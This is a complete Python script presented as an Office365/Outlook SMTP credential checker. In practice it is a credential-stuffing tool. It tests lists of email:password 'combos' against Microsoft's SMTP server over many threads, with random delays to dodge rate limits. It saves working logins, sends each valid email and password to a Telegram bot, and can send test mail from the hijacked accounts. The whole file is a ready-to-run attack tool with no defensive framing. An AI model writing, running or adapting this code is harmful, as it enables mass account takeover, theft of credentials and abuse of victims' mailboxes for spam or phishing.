#!/usr/bin/env python3
"""
Advanced SMTP Office365/Outlook Credential Checker
Vérification avancée d'identifiants SMTP Office365/Outlook

Features:
- Multi-threaded SMTP testing
- Email deliverability checking
- Telegram notifications
- Flexible input format support
- Advanced error handling
- Real-time results logging
"""

import smtplib
import ssl
import time
import random
import os
import re
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from typing import Dict, List, Tuple, Optional
import requests
import json
from datetime import datetime

# Configuration
CONFIG = {
    'smtp_server': 'smtp.office365.com',
    'smtp_port': 587,
    'smtp_timeout': 10,
    'max_threads': 8,
    'delay_range': (1, 5),  # Random delay between attempts in seconds
    'test_email_recipient': '',  # Set this to your test email
    'telegram_bot_token': '',  # Set your Telegram bot token
    'telegram_chat_id': '',  # Set your Telegram chat ID
    'input_file': 'combos.txt',
    'valid_file': 'valid.txt',
    'invalid_file': 'invalid.txt',
    'log_file': 'smtp_checker.log'
}

# Color codes for terminal output
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

# Setup logging
def setup_logging():
    """Configure logging for the application"""
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(CONFIG['log_file']),
            logging.StreamHandler()
        ]
    )
    return logging.getLogger(__name__)

class SMTPChecker:
    def __init__(self):
        self.logger = setup_logging()
        self.results = {
            'valid': [],
            'invalid': [],
            'errors': [],
            'total_tested': 0,
            'start_time': time.time()
        }
        
    def parse_combo_line(self, line: str) -> Optional[Tuple[str, str]]:
        """Parse a combo line supporting multiple separators"""
        line = line.strip()
        if not line or line.startswith('#'):
            return None
            
        # Support different separators: : ; |
        for separator in [':', ';', '|']:
            if separator in line:
                parts = line.split(separator, 1)
                if len(parts) == 2:
                    email, password = parts[0].strip(), parts[1].strip()
                    if self.validate_email(email):
                        return email, password
        return None
    
    def validate_email(self, email: str) -> bool:
        """Basic email validation"""
        pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        return re.match(pattern, email) is not None
    
    def test_smtp_credentials(self, email: str, password: str) -> Dict:
        """Test SMTP credentials and return detailed results"""
        result = {
            'email': email,
            'password': password,
            'status': 'invalid',
            'error': None,
            'smtp_success': False,
            'test_email_sent': False,
            'deliverability': 'unknown'
        }
        
        try:
            # Create SMTP connection
            with smtplib.SMTP(CONFIG['smtp_server'], CONFIG['smtp_port'], timeout=CONFIG['smtp_timeout']) as server:
                server.starttls(context=ssl.create_default_context())
                server.login(email, password)
                
                result['status'] = 'valid'
                result['smtp_success'] = True
                
                # Send test email if configured
                if CONFIG['test_email_recipient']:
                    test_result = self.send_test_email(server, email, password)
                    result.update(test_result)
                
                self.logger.info(f"{Colors.GREEN}[VALID]{Colors.END} {email}:{password}")
                
        except smtplib.SMTPAuthenticationError as e:
            result['error'] = f'Authentication failed: {str(e)}'
            self.logger.info(f"{Colors.RED}[INVALID]{Colors.END} {email} - Auth failed")
            
        except smtplib.SMTPServerDisconnected as e:
            result['error'] = f'Server disconnected: {str(e)}'
            result['status'] = 'error'
            self.logger.warning(f"{Colors.YELLOW}[DISCONNECTED]{Colors.END} {email} - Server disconnected")
            
        except smtplib.SMTPException as e:
            result['error'] = f'SMTP error: {str(e)}'
            result['status'] = 'error'
            self.logger.warning(f"{Colors.YELLOW}[SMTP_ERROR]{Colors.END} {email} - {str(e)}")
            
        except ssl.SSLError as e:
            result['error'] = f'SSL error: {str(e)}'
            result['status'] = 'error'
            self.logger.warning(f"{Colors.YELLOW}[SSL_ERROR]{Colors.END} {email} - SSL error")
            
        except Exception as e:
            result['error'] = f'Unexpected error: {str(e)}'
            result['status'] = 'error'
            self.logger.error(f"{Colors.RED}[ERROR]{Colors.END} {email} - {str(e)}")
        
        return result
    
    def send_test_email(self, server: smtplib.SMTP, sender_email: str, sender_password: str) -> Dict:
        """Send a test email and check deliverability"""
        test_result = {
            'test_email_sent': False,
            'deliverability': 'unknown'
        }
        
        try:
            # Create test email
            msg = MIMEMultipart()
            msg['From'] = sender_email
            msg['To'] = CONFIG['test_email_recipient']
            msg['Subject'] = f"SMTP Test from {sender_email}"
            
            body = f"""
            This is a test email sent from {sender_email}
            
            Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
            Purpose: SMTP credential validation
            """
            
            msg.attach(MIMEText(body, 'plain'))
            
            # Send email
            server.send_message(msg)
            test_result['test_email_sent'] = True
            
            # Basic deliverability check (simplified)
            test_result['deliverability'] = 'sent'
            
            self.logger.info(f"{Colors.CYAN}[TEST_EMAIL_SENT]{Colors.END} {sender_email} -> {CONFIG['test_email_recipient']}")
            
        except Exception as e:
            self.logger.warning(f"{Colors.YELLOW}[TEST_EMAIL_FAILED]{Colors.END} {sender_email} - {str(e)}")
        
        return test_result
    
    def send_telegram_notification(self, result: Dict):
        """Send Telegram notification for valid credentials"""
        if not CONFIG['telegram_bot_token'] or not CONFIG['telegram_chat_id']:
            return
        
        try:
            message = f"""
🔑 *Valid SMTP Credentials Found*

📧 Email: `{result['email']}`
🔐 Password: `{result['password']}`
✅ Status: {result['status']}
📨 Test Email: {'Sent' if result['test_email_sent'] else 'Not sent'}
📬 Deliverability: {result['deliverability']}

⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
            """.strip()
            
            url = f"https://api.telegram.org/bot{CONFIG['telegram_bot_token']}/sendMessage"
            data = {
                'chat_id': CONFIG['telegram_chat_id'],
                'text': message,
                'parse_mode': 'Markdown'
            }
            
            response = requests.post(url, data=data, timeout=10)
            if response.status_code == 200:
                self.logger.info(f"{Colors.BLUE}[TELEGRAM_SENT]{Colors.END} Notification sent for {result['email']}")
            else:
                self.logger.warning(f"{Colors.YELLOW}[TELEGRAM_FAILED]{Colors.END} Failed to send notification")
                
        except Exception as e:
            self.logger.error(f"{Colors.RED}[TELEGRAM_ERROR]{Colors.END} {str(e)}")
    
    def save_result(self, result: Dict):
        """Save result to appropriate file"""
        if result['status'] == 'valid':
            self.results['valid'].append(result)
            with open(CONFIG['valid_file'], 'a', encoding='utf-8') as f:
                f.write(f"{result['email']}:{result['password']}\n")
            
            # Send Telegram notification for valid credentials
            self.send_telegram_notification(result)
            
        elif result['status'] == 'invalid':
            self.results['invalid'].append(result)
            with open(CONFIG['invalid_file'], 'a', encoding='utf-8') as f:
                f.write(f"{result['email']}:{result['password']}\n")
                
        else:  # errors
            self.results['errors'].append(result)
            with open('errors.txt', 'a', encoding='utf-8') as f:
                f.write(f"{result['email']}:{result['password']} - {result['error']}\n")
    
    def process_combo(self, combo_data: Tuple[str, str]) -> Dict:
        """Process a single combo with random delay"""
        email, password = combo_data
        
        # Random delay to avoid rate limiting
        delay = random.uniform(*CONFIG['delay_range'])
        time.sleep(delay)
        
        # Test the credentials
        result = self.test_smtp_credentials(email, password)
        
        # Save the result
        self.save_result(result)
        
        self.results['total_tested'] += 1
        
        return result
    
    def load_combos(self) -> List[Tuple[str, str]]:
        """Load combos from input file"""
        combos = []
        
        try:
            with open(CONFIG['input_file'], 'r', encoding='utf-8') as f:
                for line_num, line in enumerate(f, 1):
                    combo = self.parse_combo_line(line)
                    if combo:
                        combos.append(combo)
                    elif line.strip() and not line.strip().startswith('#'):
                        self.logger.warning(f"Invalid combo format at line {line_num}: {line.strip()}")
                        
        except FileNotFoundError:
            self.logger.error(f"{Colors.RED}Input file '{CONFIG['input_file']}' not found{Colors.END}")
            return []
        except Exception as e:
            self.logger.error(f"{Colors.RED}Error reading input file: {str(e)}{Colors.END}")
            return []
        
        self.logger.info(f"{Colors.CYAN}Loaded {len(combos)} combos from {CONFIG['input_file']}{Colors.END}")
        return combos
    
    def run(self):
        """Main execution method"""
        self.logger.info(f"{Colors.BOLD}{Colors.CYAN}🚀 Starting Advanced SMTP Checker{Colors.END}")
        
        # Load combos
        combos = self.load_combos()
        if not combos:
            self.logger.error("No valid combos to process")
            return
        
        # Clear previous results files
        for file_path in [CONFIG['valid_file'], CONFIG['invalid_file'], 'errors.txt']:
            if os.path.exists(file_path):
                os.remove(file_path)
        
        # Process combos with multithreading
        with ThreadPoolExecutor(max_workers=CONFIG['max_threads']) as executor:
            future_to_combo = {executor.submit(self.process_combo, combo): combo for combo in combos}
            
            completed = 0
            for future in as_completed(future_to_combo):
                completed += 1
                combo = future_to_combo[future]
                
                try:
                    result = future.result()
                    # Progress indicator
                    if completed % 10 == 0 or completed == len(combos):
                        progress = (completed / len(combos)) * 100
                        self.logger.info(f"{Colors.BLUE}Progress: {completed}/{len(combos)} ({progress:.1f}%){Colors.END}")
                        
                except Exception as e:
                    self.logger.error(f"{Colors.RED}Error processing {combo[0]}: {str(e)}{Colors.END}")
        
        # Print final summary
        self.print_summary()
    
    def print_summary(self):
        """Print final summary of results"""
        total_time = time.time() - self.results['start_time']
        
        print(f"\n{Colors.BOLD}{Colors.CYAN}=" * 60)
        print(f"              📊 FINAL SUMMARY")
        print(f"=" * 60 + Colors.END)
        
        print(f"{Colors.WHITE}📈 Total Combos Tested: {Colors.BOLD}{self.results['total_tested']}{Colors.END}")
        print(f"{Colors.GREEN}✅ Valid Credentials: {Colors.BOLD}{len(self.results['valid'])}{Colors.END}")
        print(f"{Colors.RED}❌ Invalid Credentials: {Colors.BOLD}{len(self.results['invalid'])}{Colors.END}")
        print(f"{Colors.YELLOW}⚠️  Errors: {Colors.BOLD}{len(self.results['errors'])}{Colors.END}")
        print(f"{Colors.BLUE}⏱️  Total Time: {Colors.BOLD}{total_time:.2f} seconds{Colors.END}")
        
        if self.results['valid']:
            print(f"\n{Colors.GREEN}{Colors.BOLD}Valid Credentials:{Colors.END}")
            for result in self.results['valid']:
                test_email_status = "✓" if result['test_email_sent'] else "✗"
                print(f"  📧 {result['email']}:{result['password']} [Test Email: {test_email_status}]")
        
        if len(self.results['valid']) > 0:
            success_rate = (len(self.results['valid']) / self.results['total_tested']) * 100
            print(f"\n{Colors.CYAN}📊 Success Rate: {Colors.BOLD}{success_rate:.2f}%{Colors.END}")
        
        print(f"\n{Colors.WHITE}📁 Results saved to:")
        print(f"  ✅ Valid: {CONFIG['valid_file']}")
        print(f"  ❌ Invalid: {CONFIG['invalid_file']}")
        print(f"  ⚠️  Errors: errors.txt")
        print(f"  📋 Logs: {CONFIG['log_file']}{Colors.END}")
        
        print(f"\n{Colors.BOLD}{Colors.CYAN}✨ SMTP Checking Complete! ✨{Colors.END}\n")

def load_config_from_file():
    """Load configuration from config file if exists"""
    config_file = 'config.json'
    if os.path.exists(config_file):
        try:
            with open(config_file, 'r', encoding='utf-8') as f:
                file_config = json.load(f)
                CONFIG.update(file_config)
                print(f"{Colors.CYAN}Configuration loaded from {config_file}{Colors.END}")
        except Exception as e:
            print(f"{Colors.YELLOW}Warning: Could not load config file: {str(e)}{Colors.END}")

def create_sample_config():
    """Create a sample configuration file"""
    sample_config = {
        "test_email_recipient": "your-test-email@gmail.com",
        "telegram_bot_token": "YOUR_BOT_TOKEN_HERE",
        "telegram_chat_id": "YOUR_CHAT_ID_HERE",
        "max_threads": 8,
        "delay_range": [1, 5],
        "smtp_timeout": 10
    }
    
    with open('config.json.example', 'w', encoding='utf-8') as f:
        json.dump(sample_config, f, indent=4)
    
    print(f"{Colors.CYAN}Sample configuration created: config.json.example{Colors.END}")
    print("Copy it to config.json and update with your settings.")

if __name__ == "__main__":
    print(f"{Colors.BOLD}{Colors.CYAN}Advanced SMTP Office365/Outlook Checker{Colors.END}")
    print(f"{Colors.WHITE}Version 1.0 - Multi-threaded with advanced features{Colors.END}\n")
    
    # Load configuration
    load_config_from_file()
    
    # Create sample config if it doesn't exist
    if not os.path.exists('config.json'):
        create_sample_config()
    
    # Check if input file exists
    if not os.path.exists(CONFIG['input_file']):
        print(f"{Colors.RED}Input file '{CONFIG['input_file']}' not found!{Colors.END}")
        print(f"{Colors.WHITE}Create a file with email:password combinations (one per line){Colors.END}")
        exit(1)
    
    # Start the checker
    checker = SMTPChecker()
    try:
        checker.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}⚠️  Process interrupted by user{Colors.END}")
        checker.print_summary()
    except Exception as e:
        print(f"\n{Colors.RED}💥 Fatal error: {str(e)}{Colors.END}")
        logging.error(f"Fatal error: {str(e)}")